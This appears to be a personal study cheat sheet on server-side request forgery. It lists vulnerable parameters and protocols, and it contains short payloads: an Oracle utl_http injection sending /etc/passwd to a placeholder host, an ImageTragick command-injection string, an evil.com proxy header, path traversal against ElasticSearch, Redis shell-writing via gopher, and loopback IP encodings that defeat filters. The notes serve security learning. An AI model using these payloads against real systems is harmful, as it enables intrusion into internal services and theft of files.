# SSRF
Server Side Request Forge  
Bypass the firewall and grope through the intranet  

![ssrf](https://github.com/shinmao/Web-Security-Learning/blob/master/SSRF/screenshot/SSRF.png)  
1. Find the vulnerable place > 2. with Protocol > 3. Apply to deeper attack > 4. Bypass

# Find the vulnerable place
**Controllable** URL parameter：url, src, imgURL, share, wap, link  
share the content via URL  
translate the context with online translator  
load the pic with URL  
some api  
1. XXE(You can directly see in my XXE part)  
```php
<!ENTITY % file SYSTEM "file://url/xxx">
```
  
2. `file_get_contents($url)`(PHP)  
```php
$image = file_get_contents('http://self-ip');
```
[Day 20 - Stocking](https://www.ripstech.com/php-security-calendar-2017/#day-20)  
  
3. curl(PHP)  
in fact, from `curl -V` we can see the libcurl support many protocols  
  
4. Oracle UTL_HTTP  
```php
?id=1'||CTXSYS.DRITHSX.SN(user,substr(utl_http.request('http://example.com?download=/etc/passwd'),1,160))||'
```  
  
5. ImageTragick  
```php
...
fill 'url(https://example.com/";|ls "-la)'
...
```  
[ImageTragick](https://imagetragick.com/)  
CVE-2016-3718  
POC on Facebook  

6. Header HTTP proxy  
According to CGI, headers in the request would be replaced with env variables  
e.g. Host -> $HTTP_HOST, Proxy -> $HTTP_Proxy  
This is the vul  
```php
GET
...
Proxy: http://evil.com/
```  
hijack the http connection  

In addition to find the potential parameter, we also can set up a server or DNS logger. If we get request from the server side, there might be vul to SSRF somewhere.


# with Protocol  
![](https://farm2.staticflickr.com/1774/43295065584_6cfa758570_b.jpg)  
gopher is an awesome protocol to attack intranet service  
[利用 Gopher 协议拓展攻击面-转载长亭科技](https://blog.chaitin.cn/gopher-attack-surfaces/)  
Jar is a protocol which can be used to create controllable temp file  
FTP or SMB can also be used on bruteforce of password  

# Apply to deeper attack  
Attack service built in intranet  
1. Struts2  
  
2. ElasticSearch - port:9200  
CVE-2014-3120  
CVE-2015-1427  
CVE-2015-3337  
```php
http://example.com:9200/_plugin/head/../../../../../../etc/passwd
```  
  
3. Neo4j, CouchDB, MongoDB  
Visit API -> modify settings -> RCE  
  
4. Tomcat - port:8005  
SSRF with gopher  
  
5. Zabbix - port:10050  
SSRF with gopher  
  
6. Redis - port:6379  
Write shell with gopher -> write SSH key with SAVE -> write crontab with SAVE -> SET to exploit again  

7. FastCGI - port:9000  
```php
gopher://example.com:9000/....
```

# Bypass  
I would check your schema, host, port  
* Bypass DNS limit:  
A special domain provider> `xip.io`  
DNS rebinding: use Round-Robin to bypass  
  
* Bypass ip limit:  
ip can be decimal, hexidecimal, or Octal  
```php
127.0.0.1
127.0.1
127.1
0.0.0.0
0.0
0
0x7f000001
2130706433
017700000001
```  
This tricks can be used to bypass wordpress protection on SSRF in CVE-2016-4029

## Reference
* Orange Slides
